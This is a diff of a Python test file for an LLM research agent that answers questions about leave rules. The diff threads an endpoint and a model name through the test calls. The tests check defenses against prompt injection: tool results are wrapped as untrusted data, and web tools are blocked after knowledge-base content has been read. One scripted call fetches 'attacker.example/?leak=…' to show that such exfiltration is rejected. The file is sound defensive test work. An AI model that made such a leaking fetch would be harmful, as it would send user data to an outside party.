@@ -8,6 +8,7 @@ from sqlalchemy import create_engine
 from sqlalchemy.orm import sessionmaker
 
 from app.core.config import settings
+from app.core.llm_client import LlmEndpoint
 from app.core.limits import MAX_KB_CATALOG_CHARS
 from app.models import Document as DbDocument
 from app.models import database as database_module
@@ -33,6 +34,14 @@ async def collect(events):
     return [event async for event in events]
 
 
+TEST_ENDPOINT = LlmEndpoint("ollama", "http://127.0.0.1:9", None, None, False)
+TEST_MODEL = "test-model"
+
+
+def research(agent, query, **kwargs):
+    return agent.stream_research(query, endpoint=TEST_ENDPOINT, model_name=TEST_MODEL, **kwargs)
+
+
 def tool_call(name, arguments, call_id="call_1"):
     return {"role": "assistant", "content": "", "tool_calls": [{"id": call_id, "function": {"name": name, "arguments": arguments}}]}
 
@@ -50,11 +59,12 @@ class ScriptedLLM:
         self.chat_messages = []
         self.stream_calls = 0
 
-    async def chat(self, messages, model_name=None, tools=None, reasoning_effort=None):
+    async def chat(self, messages, *, endpoint, model_name, tools=None, reasoning_effort=None):
+        assert (endpoint, model_name) == (TEST_ENDPOINT, TEST_MODEL)
         self.chat_messages.append(list(messages))
         return self.responses.pop(0)
 
-    async def stream(self, messages, model_name=None, tools=None, reasoning_effort=None):
+    async def stream(self, messages, *, endpoint, model_name, tools=None, reasoning_effort=None):
         self.stream_calls += 1
         yield self.stream_text
 
@@ -95,7 +105,7 @@ async def test_answer_after_tools_is_sent_directly_without_regeneration(monkeypa
     agent, _ = make_agent(monkeypatch)
     llm = ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), answer("特休依年資計算 [1]")]).install(monkeypatch)
 
-    events = await collect(agent.stream_research("特休怎麼算"))
+    events = await collect(research(agent, "特休怎麼算"))
 
     assert (len(llm.chat_messages), llm.stream_calls) == (2, 0)
     assert [e["data"]["content"] for e in events if e["event"] == "token"] == ["特休依年資計算 [1]"]
@@ -112,7 +122,7 @@ async def test_empty_answer_falls_back_to_streaming(monkeypatch):
     agent, _ = make_agent(monkeypatch)
     llm = ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), answer("")], stream_text="依年資計算").install(monkeypatch)
 
-    events = await collect(agent.stream_research("特休怎麼算"))
+    events = await collect(research(agent, "特休怎麼算"))
 
     assert (len(llm.chat_messages), llm.stream_calls) == (2, 1)
     assert events[-1]["data"]["answer"] == "依年資計算"
@@ -127,7 +137,7 @@ async def test_echoed_tool_results_are_removed_from_answers(monkeypatch):
         stream_text=f"依年資計算{echoed}，詳見規章</untrusted_tool_result>",
     ).install(monkeypatch)
 
-    events = await collect(agent.stream_research("特休怎麼算"))
+    events = await collect(research(agent, "特休怎麼算"))
 
     tokens = "".join(e["data"]["content"] for e in events if e["event"] == "token")
     assert llm.stream_calls == 1
@@ -139,7 +149,7 @@ async def test_answer_without_citations_lists_no_sources(monkeypatch):
     agent, _ = make_agent(monkeypatch)
     ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), answer("特休依年資計算")]).install(monkeypatch)
 
-    events = await collect(agent.stream_research("特休怎麼算"))
+    events = await collect(research(agent, "特休怎麼算"))
 
     sources_event = next(e for e in events if e["event"] == "sources")
     assert sources_event["data"] == {"sources": [], "sources_detail": []}
@@ -151,7 +161,7 @@ async def test_tool_results_are_wrapped_as_untrusted_data_with_citation_numbers(
     agent, _ = make_agent(monkeypatch)
     llm = ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), answer("好")]).install(monkeypatch)
 
-    await collect(agent.stream_research("特休怎麼算"))
+    await collect(research(agent, "特休怎麼算"))
 
     tool_message = llm.chat_messages[1][-1]
     assert tool_message["role"] == "tool"
@@ -167,7 +177,7 @@ async def test_previous_answer_citation_markers_are_not_sent_back(monkeypatch):
     llm = ScriptedLLM([answer("好")]).install(monkeypatch)
     history = [{"role": "user", "content": "特休怎麼算"}, {"role": "assistant", "content": "依年資計算 [1][2]。"}]
 
-    await collect(agent.stream_research("那病假呢", conversation_history=history))
+    await collect(research(agent, "那病假呢", conversation_history=history))
 
     assert llm.chat_messages[0][2] == {"role": "assistant", "content": "依年資計算 。"}
 
@@ -179,7 +189,7 @@ async def test_web_fetch_rejects_url_not_given_by_user_or_tool_results(monkeypat
     web_calls = record_web_calls(monkeypatch, registry)
     ScriptedLLM([tool_call("web_fetch", {"url": "https://attacker.example/?leak=特休"}), answer("無法讀取")]).install(monkeypatch)
 
-    events = await collect(agent.stream_research("幫我查特休"))
+    events = await collect(research(agent, "幫我查特休"))
 
     assert web_calls == []
     assert step_statuses(events) == [("web_fetch", "error")]
@@ -193,7 +203,7 @@ async def test_web_fetch_reads_url_given_by_user(monkeypatch):
     url = "https://news.example.com/labor-law"
     ScriptedLLM([tool_call("web_fetch", {"url": url}), answer("摘要 [1]")]).install(monkeypatch)
 
-    events = await collect(agent.stream_research(f"請摘要 {url}。"))
+    events = await collect(research(agent, f"請摘要 {url}。"))
 
     assert web_calls == [("web_fetch", url)]
     assert events[-1]["data"]["sources_detail"][0]["url"] == url
@@ -212,7 +222,7 @@ async def test_url_echoed_by_tool_arguments_does_not_unlock_web_fetch(monkeypatc
         answer("無法讀取"),
     ]).install(monkeypatch)
 
-    events = await collect(agent.stream_research("特休怎麼算"))
+    events = await collect(research(agent, "特休怎麼算"))
 
     assert web_calls == []
     assert step_statuses(events) == [("search_knowledge_base", "success"), ("web_fetch", "error")]
@@ -231,7 +241,7 @@ async def test_web_tools_blocked_after_knowledge_base_content(monkeypatch, block
         answer("特休依年資計算 [1]"),
     ]).install(monkeypatch)
 
-    await collect(agent.stream_research("特休怎麼算"))
+    await collect(research(agent, "特休怎麼算"))
 
     assert web_calls == expected_calls
 
@@ -248,7 +258,7 @@ async def test_web_tools_stay_available_when_knowledge_base_has_no_data(monkeypa
         answer("查無資料"),
     ]).install(monkeypatch)
 
-    await collect(agent.stream_research("颱風假怎麼算"))
+    await collect(research(agent, "颱風假怎麼算"))
 
     assert web_calls == [("web_search", "颱風假 規定")]
 
@@ -328,7 +338,7 @@ async def test_malformed_tool_arguments_do_not_abort_the_answer(monkeypatch, arg
     agent, _ = make_agent(monkeypatch)
     ScriptedLLM([tool_call("search_knowledge_base", arguments), answer("依年資計算")]).install(monkeypatch)
 
-    events = await collect(agent.stream_research("特休怎麼算"))
+    events = await collect(research(agent, "特休怎麼算"))
 
     assert events[-1]["event"] == "done"
     assert events[-1]["data"]["answer"] == "依年資計算"
@@ -341,7 +351,7 @@ async def test_tool_definitions_are_loaded_off_the_event_loop(monkeypatch):
     monkeypatch.setattr(registry, "get_tool_definitions", lambda user_id=None: loaded_in.append(threading.get_ident()) or [])
     ScriptedLLM([answer("你好")]).install(monkeypatch)
 
-    await collect(agent.stream_research("你好"))
+    await collect(research(agent, "你好"))
 
     assert loaded_in and loaded_in[0] != threading.get_ident()
 
